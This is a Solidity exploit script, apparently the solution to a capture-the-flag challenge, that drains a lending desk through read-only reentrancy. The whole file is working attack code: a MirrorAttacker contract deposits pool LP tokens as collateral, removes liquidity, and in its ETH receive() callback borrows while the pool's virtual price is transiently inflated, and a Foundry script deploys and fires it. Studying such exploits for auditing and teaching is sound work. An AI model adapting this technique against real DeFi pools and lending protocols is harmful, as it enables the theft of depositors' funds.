// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "../Cheats.sol";
import "../../src/C4Mirror.sol";

/// Read-only reentrancy: remove liquidity, and in the ETH callback — while the
/// pool's virtual price is transiently inflated — borrow the desk dry.
contract MirrorAttacker {
    StablePool public pool;
    LendingDesk public desk;
    uint256 public borrowAmt;
    bool private done;

    constructor(StablePool p, LendingDesk d) { pool = p; desk = d; }

    function pwn(uint256 collatLP, uint256 removeLP, uint256 _borrowAmt) external {
        borrowAmt = _borrowAmt;
        pool.approve(address(desk), collatLP);
        desk.deposit(collatLP);
        pool.removeLiquidity(removeLP);   // triggers receive() mid-removal
    }

    receive() external payable {
        if (!done && msg.sender == address(pool)) {
            done = true;
            desk.borrow(borrowAmt);        // inflated virtual price here
        }
    }
}

contract SolveC4 is Script {
    function run() external {
        MirrorSetup setup = MirrorSetup(vm.envAddress("SETUP"));
        StablePool pool = setup.pool();
        LendingDesk desk = setup.desk();

        vm.startBroadcast();
        MirrorAttacker a = new MirrorAttacker(pool, desk);
        pool.transfer(address(a), 900 ether);    // move the attacker's LP in
        a.pwn(10 ether, 890 ether, 100 ether);
        vm.stopBroadcast();
    }
}
